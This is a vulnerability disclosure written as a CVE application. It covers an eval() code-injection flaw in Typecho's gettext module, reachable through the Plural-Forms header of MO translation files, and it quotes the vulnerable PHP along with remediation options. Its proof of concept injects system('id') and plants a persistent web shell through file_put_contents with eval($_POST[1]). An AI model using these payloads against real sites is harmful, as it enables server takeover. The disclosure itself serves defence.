# CVE Application: Typecho GetText eval() Remote Code Execution

## Basic Information

| Field | Content |
|------|------|
| **Vulnerability Name** | Typecho GetText Plural-Forms eval() Remote Code Execution |
| **CWE** | CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection') |
| **CWE** | CWE-94: Improper Control of Generation of Code ('Code Injection') |
| **CVSS 3.1** | 7.2 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) |
| **Affected Product** | Typecho Blog Platform |
| **Affected Versions** | 0 through 1.3.0 |
| **Discovery Date** | 2026-05-28 |
| **Vendor** | Typecho Team (http://typecho.org) |

## Vulnerability Description

Typecho is a PHP-based open-source blogging system. Its internationalization (i18n) module, when parsing MO (Machine Object) translation files, uses PHP's `eval()` function to dynamically execute plural form expressions (Plural-Forms) extracted from file headers. Because the extracted expression is passed directly to `eval()` without any filtering, an attacker who can modify translation files can inject arbitrary PHP code, achieving remote code execution.

## Vulnerable Code

**File**: `var/Typecho/I18n/GetText.php`

**Function `selectString()` (lines 361-376)**:

```php
private function selectString(int $n): int
{
    $string = $this->getPluralForms();
    $string = str_replace('nplurals', "\$total", $string);
    $string = str_replace("n", $n, $string);
    $string = str_replace('plural', "\$plural", $string);

    $total = 0;
    $plural = 0;

    eval("$string");          // <-- Attacker-controlled MO header executed directly
    if ($plural >= $total) {
        $plural = $total - 1;
    }
    return $plural;
}
```

**Function `getPluralForms()` (lines 384-406)**:

```php
private function getPluralForms(): string
{
    $this->loadTables();

    if (!is_string($this->pluralHeader)) {
        if ($this->enable_cache) {
            $header = $this->cache_translations[""];
        } else {
            $header = $this->getTranslationString(0);
        }

        if (!is_null($header) && preg_match("/plural\-forms: ([^\n]*)\n/i", $header, $regs)) {
            $expr = $regs[1];              // <-- Attacker-controllable expression
        } else {
            $expr = "nplurals=2; plural=n == 1 ? 0 : 1;";
        }
        $this->pluralHeader = $expr;
    }
    return $this->pluralHeader;
}
```

## Call Chain

```
User request (e.g., visiting article page)
  → _n('1 second ago', '%d seconds ago', $seconds)     [var/Typecho/I18n.php:100]
    → I18n::ngettext($single, $plural, $number)          [var/Typecho/I18n.php:66]
      → GetTextMulti::ngettext(...)                       [var/Typecho/I18n/GetTextMulti.php:75]
        → GetText::ngettext($single, $plural, $number)    [var/Typecho/I18n/GetText.php:145]
          → $this->selectString($number)                   [var/Typecho/I18n/GetText.php:158]
            → $this->getPluralForms()                      [var/Typecho/I18n/GetText.php:384]
              → Read MO file header, regex extract Plural-Forms
            → str_replace() variable substitution
            → eval("$string")                              [var/Typecho/I18n/GetText.php:371]
              → *** Attacker PHP code executed ***
```

## Proof of Concept

### Step 1: Construct malicious MO file

Modify the Plural-Forms header in `usr/langs/zh_CN.mo`:

**Original header**:
```
Plural-Forms: nplurals=1; plural=0;
```

**Malicious header**:
```
Plural-Forms: nplurals=1; plural=0;system('id');
```

After `str_replace`, PHP eval executes:
```php
$total=1; $plural=0;system('id');
```

### Step 2: Trigger execution

```bash
curl "http://target.com/index.php/archives/1/"
```

### Step 3: Persistent access (advanced PoC)

```
Plural-Forms: nplurals=1; plural=0;file_put_contents('shell.php','<?php @eval($_POST[1]);');
```

## Code Origin

The vulnerable code resides in Typecho's PHP-gettext fork (`var/Typecho/I18n/GetText.php`), originally by Danilo Segan and Nico Kaiser. Typecho introduced the `eval()` usage in this fork; the upstream PHP-gettext library does not use this method.

## Remediation

### Option 1 (Recommended): Replace eval with expression parser

Implement a safe Plural-Forms expression parser that handles only the standard format:
`nplurals=INTEGER; plural=n CONDITION ? VALUE : VALUE;`

### Option 2: Whitelist regex validation

```php
if (!preg_match('/^nplurals\s*=\s*\d+\s*;\s*plural\s*=\s*n\s*[=<>!]+\s*\d+\s*\?\s*\d+\s*:\s*\d+\s*;?\s*$/', $expr)) {
    $expr = "nplurals=2; plural=n == 1 ? 0 : 1;";
}
```

## Timeline

| Date | Event |
|------|------|
| 2026-05-28 | Vulnerability discovered |
| 2026-05-28 | PoC verified |
| TBD | CVE application submitted |
| TBD | Vendor notified |
| TBD | Vendor fix |
| TBD | CVE assigned |

---

*This document serves as complete technical support material for the CVE application.*
